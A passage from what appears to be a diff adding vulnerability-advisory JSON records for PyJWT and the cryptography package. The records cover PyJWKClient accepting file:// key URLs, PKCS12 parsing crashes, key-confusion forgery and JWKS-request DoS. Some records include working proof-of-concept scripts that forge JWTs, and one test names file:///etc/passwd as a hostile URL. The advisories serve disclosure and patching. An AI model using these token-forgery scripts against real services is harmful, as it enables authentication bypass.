`json.load`.\n2. Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).\n3. **Forge tokens that PyJWT verifies as valid** \u2014 if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and `jwt.decode()` accepts.\n\n## Affected versions\n\nTested and reproducible on **PyJWT 2.11.0 and 2.12.1**. Likely all versions back to PyJWKClient introduction.\n\n## Reproducer (full attack chain \u2014 verified empirically)\n\n```python\nimport jwt as pyjwt\nfrom jwt import PyJWKClient\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport json, base64, time\n\n# Attacker generates keypair (no relation to real IdP)\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub_n = key.public_key().public_numbers().n\n\ndef b64u(n):\n    bl = (n.bit_length() + 7) // 8\n    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()\n\n# Attacker writes JWK Set containing their public key to /tmp\njwks = {\"keys\":[{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"alg\":\"RS256\",\n                  \"n\":b64u(pub_n),\"e\":\"AQAB\"}]}\nwith open(\"/tmp/attacker.json\",\"w\") as f:\n    json.dump(jwks, f)\n\n# Attacker mints token signed with their private key, jku=file://\npriv_pem = key.private_bytes(serialization.Encoding.PEM,\n    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())\nnow = int(time.time())\ntoken = pyjwt.encode(\n    {\"sub\":\"attacker\",\"aud\":\"target-app\",\"iat\":now,\"exp\":now+3600},\n    priv_pem, algorithm=\"RS256\",\n    headers={\"kid\":\"attacker\",\"jku\":\"file:///tmp/attacker.json\",\"typ\":\"JWT\"})\n\n# Vulnerable application pattern: caller derives jku from token header\n# and passes to PyJWKClient without scheme validation\nheader = pyjwt.get_unverified_header(token)\nclient = PyJWKClient(header[\"jku\"])      # <-- accepts file:// silently\nkey_obj = client.get_signing_key_from_jwt(token)\ndecoded = pyjwt.decode(token, key_obj.key, algorithms=[\"RS256\"],\n                       audience=\"target-app\")\nprint(\"Token verified:\", decoded)\n# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}\n```\n\n## Cross-library evidence \u2014 PyJWT is the outlier\n\nThe same composition pattern is structurally safe in 4 other mainstream JWT libraries:\n\n| Library | Behavior on `jku=file://...` | Mechanism |\n|---|---|---|\n| **PyJWT 2.12.1** (Python) | **Reads file from disk, parses, uses for signature verification** | urllib default OpenerDirector includes FileHandler |\n| panva/jose 6.2.3 (Node.js) | Refuses pre-fetch | WHATWG `fetch()` rejects non-http(s) at fetch-spec layer |\n| golang-jwt + MicahParks/keyfunc v3.4.0 (Go) | Refuses pre-fetch | `http.DefaultTransport` only registers http/https |\n| Microsoft.IdentityModel.Tokens 8.18.0 (.NET) | Refuses pre-fetch | `HttpDocumentRetriever` defaults `RequireHttps=true` |\n| Spring Security NimbusJwtDecoder 6.3.4 (Java) | Refuses pre-fetch | URI parser delegation refuses non-http(s) at request build |\n\nPyJWT is the only library of these 5 where the default behavior allows `file://` to reach the fetch layer.\n\n## Recommended fix\n\nAdd `allowed_schemes: tuple[str, ...] = (\"https\", \"http\")` kwarg to `PyJWKClient.__init__`. Pre-validate URL scheme before invoking `urllib.request.urlopen`. URLs with disallowed schemes raise `PyJWKClientError` before any fetch is attempted.\n\n### Diff sketch against `jwt/jwks_client.py`\n\n```python\ndef __init__(\n    self, uri: str,\n    cache_keys: bool = False, max_cached_keys: int = 16,\n    cache_jwk_set: bool = True, lifespan: float = 300,\n    headers: dict[str, Any] | None = None, timeout: float = 30,\n    ssl_context: SSLContext | None = None,\n    allowed_schemes: tuple[str, ...] = (\"https\", \"http\"),  # NEW\n):\n    \"\"\"...\n    :param allowed_schemes: URL schemes the JWKS endpoint is permitted\n        to use. Default ``(\"https\", \"http\")``. Pass ``(\"https\",)`` for\n        HTTPS-only operation. URLs with disallowed schemes raise\n        ``PyJWKClientError`` before any fetch is attempted.\n    \"\"\"\n    # ... existing init code ...\n    self.allowed_schemes = allowed_schemes\n    self._validate_uri_scheme()\n\n\ndef _validate_uri_scheme(self) -> None:\n    \"\"\"Reject the configured URI early if its scheme isn't allowed.\"\"\"\n    from urllib.parse import urlparse\n    parsed = urlparse(self.uri)\n    scheme = parsed.scheme.lower()\n    if not scheme:\n        raise PyJWKClientError(\n            f\"PyJWKClient URI '{self.uri}' has no scheme; expected one of \"\n            f\"{self.allowed_schemes!r}\")\n    if scheme not in self.allowed_schemes:\n        raise PyJWKClientError(\n            f\"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes \"\n            f\"{self.allowed_schemes!r}; refusing to fetch from this URL\")\n```\n\n### Tests to add\n\n```python\ndef test_pyjwkclient_rejects_file_scheme():\n    with pytest.raises(PyJWKClientError, match=\"not in allowed_schemes\"):\n        PyJWKClient(\"file:///etc/passwd\")\n\ndef test_pyjwkclient_rejects_ftp_scheme():\n    with pytest.raises(PyJWKClientError):\n        PyJWKClient(\"ftp://example.org/keys.json\")\n\ndef test_pyjwkclient_rejects_data_scheme():\n    with pytest.raises(PyJWKClientError):\n        PyJWKClient('data:application/json,{\"keys\":[]}')\n\ndef test_pyjwkclient_caller_can_lock_to_https_only():\n    with pytest.raises(PyJWKClientError):\n        PyJWKClient(\"http://internal.test/jwks.json\", allowed_schemes=(\"https\",))\n```\n\n### Compatibility\n\n- Default `allowed_schemes=(\"https\", \"http\")` preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints\n- Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)\n- No changes to urllib fetch logic itself \u2014 the fix is a pre-validation gate\n\n## Class precedent\n\nThis is the same class as **CVE-2024-21643** (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.\n\n## Prior art (verified 2026-05-06)\n\nConfirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):\n\n- No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling\n- No existing GitHub issue or PR addressing scheme allowlisting\n- No silent fix in CHANGELOG through 2.12.1\n- 5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) \u2014 none cover this class\n\n## Credit\n\nReported by Keijo Tuominen \u2014 independent security research at CMHT.tech (https://cmht.tech).\n\nReproduction artifacts available on request: full multi-language probe pack (5 wrappers \u00d7 25 fixtures \u00d7 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.",
+    "aliases": [
+      "CVE-2026-48522",
+      "PYSEC-2026-175"
+    ],
+    "modified": "2026-09-10T03:50:49.179286182Z",
+    "published": "2026-06-15T19:28:41Z",
+    "database_specific": {
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-15T19:28:41Z",
+      "nvd_published_at": "2026-05-28T16:16:29Z",
+      "cwe_ids": [
+        "CWE-441",
+        "CWE-918"
+      ],
+      "severity": "MODERATE"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48522"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/github/advisory-database/pull/8521"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jpadilla/pyjwt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "pyjwt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/pyjwt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.0.0"
+              },
+              {
+                "fixed": "2.13.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.0.0",
+          "2.0.1",
+          "2.1.0",
+          "2.10.0",
+          "2.10.1",
+          "2.11.0",
+          "2.12.0",
+          "2.12.1",
+          "2.2.0",
+          "2.3.0",
+          "2.4.0",
+          "2.5.0",
+          "2.6.0",
+          "2.7.0",
+          "2.8.0",
+          "2.9.0"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.12.1",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-993g-76c3-p5m4/GHSA-993g-76c3-p5m4.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-9v9h-cgj8-h64p",
+    "summary": "Null pointer dereference in PKCS12 parsing",
+    "details": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
+    "aliases": [
+      "CVE-2024-0727",
+      "PYSEC-2026-1285"
+    ],
+    "modified": "2026-09-10T03:50:09.410128409Z",
+    "published": "2024-01-26T09:30:23Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-476"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2024-02-16T20:48:36Z",
+      "nvd_published_at": "2024-01-26T09:15:07Z"
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-0727"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/github/advisory-database/pull/3472"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/openssl/openssl/pull/23362"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.openssl.org/news/secadv/20240125.txt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://security.netapp.com/advisory/ntap-20240208-0006"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2024/11/msg00000.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2024/10/msg00033.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8"
+      },
+      {
+        "type": "WEB",
+        "url": "https://cert-portal.siemens.com/productcert/html/ssa-915275.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://cert-portal.siemens.com/productcert/html/ssa-769027.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://cert-portal.siemens.com/productcert/html/ssa-331112.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://cert-portal.siemens.com/productcert/html/ssa-277137.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://cert-portal.siemens.com/productcert/html/ssa-265688.html"
+      },
+      {
+        "type": "WEB",
+        "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "42.0.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1",
+          "0.2",
+          "0.2.1",
+          "0.2.2",
+          "0.3",
+          "0.4",
+          "0.5",
+          "0.5.1",
+          "0.5.2",
+          "0.5.3",
+          "0.5.4",
+          "0.6",
+          "0.6.1",
+          "0.7",
+          "0.7.1",
+          "0.7.2",
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3",
+          "41.0.4",
+          "41.0.5",
+          "41.0.6",
+          "41.0.7",
+          "42.0.0",
+          "42.0.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-9v9h-cgj8-h64p/GHSA-9v9h-cgj8-h64p.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-ffqj-6fqr-9h24",
+    "summary": "Key confusion through non-blocklisted public key formats",
+    "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\n\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \n> attacker submitting the JWT token can choose the used signing algorithm.\n> \n> The PyJWT library requires that the application chooses what algorithms \n> are supported. The application can specify \n> \"jwt.algorithms.get_default_algorithms()\" to get support for all \n> algorithms. They can also specify a single one of them (which is the \n> usual use case if calling jwt.decode directly. However, if calling \n> jwt.decode in a helper function, all algorithms might be enabled.)\n> \n> For example, if the user chooses \"none\" algorithm and the JWT checker \n> supports that, there will be no signature checking. This is a common \n> security issue with some JWT implementations.\n> \n> PyJWT combats this by requiring that the if the \"none\" algorithm is \n> used, the key has to be empty. As the key is given by the application \n> running the checker, attacker cannot force \"none\" cipher to be used.\n> \n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \n> if the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \n> attacker can just use the publicly known public key to sign the token \n> and the checker would use the same key to verify.\n> \n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \n> With ed25519, PyJWT supports public keys that start with \"ssh-\", for \n> example \"ssh-ed25519\".\n\n```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n \u00a0\u00a0\u00a0 print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key. However, if other algorithms are used, \nthe POC does not work\n# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py\n#\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 invalid_strings = [\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"-----BEGIN PUBLIC KEY-----\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"-----BEGIN CERTIFICATE-----\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"-----BEGIN RSA PUBLIC KEY-----\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"ssh-rsa\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ]\n#\n# However, OKPAlgorithm (ed25519) accepts the following in \njwt/algorithms.py:\n#\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \"-----BEGIN PUBLIC\" in str_key:\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_public_key(key)\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \"-----BEGIN PRIVATE\" in str_key:\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_private_key(key, password=None)\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if str_key[0:4] == \"ssh-\":\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_ssh_public_key(key)\n#\n# These should most likely made to match each other to prevent this behavior\n```\n\n\n```python\nimport jwt\n\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\n#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem\n#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub\n\npriv_key_bytes = b\"\"\"-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END EC PRIVATE KEY-----\"\"\"\n\npub_key_bytes = b\"\"\"-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END PUBLIC KEY-----\"\"\"\n\nssh_key_bytes = b\"\"\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\"\"\"\n\n# Making a good jwt token that should work by signing it with the private key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"ES256\")\n\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, ssh_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n    print(\"POC Successfull\")\nelse:\n    print(\"POC Failed\")\n```\n\n> The issue is not that big as \n> algorithms=jwt.algorithms.get_default_algorithms() has to be used. \n> However, with quick googling, this seems to be used in some cases at \n> least in some minor projects.\n\n### Patches\n\nUsers should upgrade to v2.4.0.\n\n### Workarounds\n\nAlways be explicit with the algorithms that are accepted and expected when decoding.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/jpadilla/pyjwt\n* Email Jos\u00e9 Padilla: pyjwt at jpadilla dot com\n",
+    "aliases": [
+      "CVE-2022-29217",
+      "PYSEC-2022-202"
+    ],
+    "modified": "2024-10-15T16:27:42.751871Z",
+    "published": "2022-05-24T22:17:27Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-327"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2022-05-24T22:17:27Z",
+      "nvd_published_at": "2022-05-24T15:15:00Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29217"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jpadilla/pyjwt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.4.0"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2022-202.yaml"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5PK7IQCBVNLYJEFTPHBBPFP72H4WUFNX"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6HIYEYZRQEP6QTHT3EHH3RGFYJIHIMAO"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "pyjwt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/pyjwt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.5.0"
+              },
+              {
+                "fixed": "2.4.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "1.5.0",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6.0",
+          "1.6.1",
+          "1.6.3",
+          "1.6.4",
+          "1.7.0",
+          "1.7.1",
+          "2.0.0",
+          "2.0.0a1",
+          "2.0.0a2",
+          "2.0.1",
+          "2.1.0",
+          "2.2.0",
+          "2.3.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-ffqj-6fqr-9h24/GHSA-ffqj-6fqr-9h24.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-fhv5-28vv-h8m8",
+    "summary": "PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)",
+    "details": "> [!NOTE]\n>  The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.\n\n## Summary\nPyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.\n\nAdditionally, fetch_data() finally block clears the JWKS cache on network error.\n\n## Root Cause\njwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown.\njwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.\n\n## Impact\n- DoS against JWKS endpoint (unlimited requests per invalid token)\n- DoS against application (network I/O latency)\n- Cascading failure (rate limiting clears cache, breaking legitimate auth)\n\n## Suggested Fix\n1. Add refresh cooldown (refuse refresh more than once per TTL period)\n2. Move cache write from finally to else block\n\n## Affected Versions\nAll versions with PyJWKClient (2.4.0 through 2.12.1)",
+    "aliases": [
+      "CVE-2026-48524",
+      "PYSEC-2026-177"
+    ],
+    "modified": "2026-09-10T03:50:49.375741307Z",
+    "published": "2026-06-15T17:28:46Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-460",
+        "CWE-755"
+      ],
+      "severity": "LOW",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-15T17:28:46Z",
+      "nvd_published_at": "2026-05-28T16:16:29Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48524"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/github/advisory-database/pull/8522"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jpadilla/pyjwt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-177.yaml"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "pyjwt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/pyjwt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.0.0"
+              },
+              {
+                "fixed": "2.13.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.0.0",
+          "2.0.1",
+          "2.1.0",
+          "2.10.0",
+          "2.10.1",
+          "2.11.0",
+          "2.12.0",
+          "2.12.1",
+          "2.2.0",
+          "2.3.0",
+          "2.4.0",
+          "2.5.0",
+          "2.6.0",
+          "2.7.0",
+          "2.8.0",
+          "2.9.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-fhv5-28vv-h8m8/GHSA-fhv5-28vv-h8m8.json",
+          "last_known_affected_version_range": "<= 2.12.1"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-h35f-9h28-mq5c",
